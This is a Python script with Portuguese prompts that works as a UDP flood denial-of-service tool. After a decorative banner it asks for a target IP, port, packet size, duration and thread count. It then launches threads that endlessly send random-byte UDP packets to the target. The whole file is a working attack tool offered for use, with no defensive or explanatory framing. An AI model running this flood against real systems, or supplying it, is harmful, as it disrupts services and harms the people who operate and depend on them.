# script by fehzxkkj
import socket
import os
import random
import threading
from time import sleep

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[38;5;213m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RED = '\033[38;5;213m'
                               
def print_line():
    print(Colors.FAIL + Colors.BOLD + "=" * 35 + Colors.ENDC)

os.system('clear')

print(Colors.RED + "                                              ")
print("                ##      ##                   ")
print(" ####  ##               ##       ####  ####  ")
print("##    #### ## # ##  ### ##  #   ##    ##  ## ")
print("###    ##  #### ## ##   ## #   ##         ## ")
print(" ###   ##  ##   ## ##   ###    ##       ###  ")
print("  ###  ##  ##   ## ##   ####   ##      ##    ")
print("   ##  ##  ##   ## ##   ## ##   ##    ##     ")
print("####    ## ##   ##  ### ##  ##   #### ###### ")
print("                                             ")
print("                                             ")

print(Colors.RED + " " + Colors.ENDC)
sleep(0.1)

print_line()
print(Colors.RED + "[ * ] Preparando o ataque..." + Colors.ENDC)
print_line()

ip = str(input(Colors.RED + "[ * ] IP do alvo: " + Colors.ENDC))
porta = int(input(Colors.RED + "[ * ] Porta do alvo: " + Colors.ENDC))
pack = int(input(Colors.RED + "[ * ] Tamanho dos pacotes (em bytes): " + Colors.ENDC))
time = int(input(Colors.RED + "[ * ] Tempo : " + Colors.ENDC))
thread_count = int(input(Colors.RED + "[ * ] Número de threads: " + Colors.ENDC))

os.system('clear')

print(Colors.RED + "                                              ")
print("                ##      ##                   ")
print(" ####  ##               ##       ####  ####  ")
print("##    #### ## # ##  ### ##  #   ##    ##  ## ")
print("###    ##  #### ## ##   ## #   ##         ## ")
print(" ###   ##  ##   ## ##   ###    ##       ###  ")
print("  ###  ##  ##   ## ##   ####   ##      ##    ")
print("   ##  ##  ##   ## ##   ## ##   ##    ##     ")
print("####    ## ##   ##  ### ##  ##   #### ###### ")
print("                                             ")
print("                                             ")
                                             
print("")
sleep(0.1)
print_line()
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" Ataque iniciado com sucesso!")
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" IP alvo: {ip}")
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" Porta alvo: {porta}")
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" Tamanho dos pacotes: {pack} bytes")
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" Threads: {thread_count}")
print(Colors.GREEN + "[ * ]" + Colors.ENDC + f" Ataque em andamento...")
print_line()

def start():
    xx = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(pack)
            for i in range(time):
                s.sendto(data, (ip, porta))
                xx += 1
        except Exception as e:
            s.close()
            print(Colors.FAIL + 'Erro ' + str(e) + Colors.ENDC)

threads = []
for x in range(thread_count):
    thread = threading.Thread(target=start)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
